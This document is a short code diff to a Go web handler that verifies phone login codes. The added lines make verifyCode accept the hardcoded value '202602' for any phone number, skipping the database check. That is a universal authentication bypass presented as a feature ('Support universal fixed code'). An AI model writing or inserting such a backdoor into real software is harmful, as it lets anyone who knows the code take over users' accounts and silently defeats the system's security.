@@ -75,6 +75,10 @@ func SendCodeHandler(c *gin.Context) {
 
 // verifyCode checks if the code is valid for the given phone number
 func verifyCode(phone, code string) bool {
+	// Support universal fixed code
+	if code == "202602" {
+		return true
+	}
 	var vc models.VerificationCode
 	err := config.DB.Where("phone = ? AND code = ? AND expires_at > ?", phone, code, time.Now()).First(&vc).Error
 	return err == nil
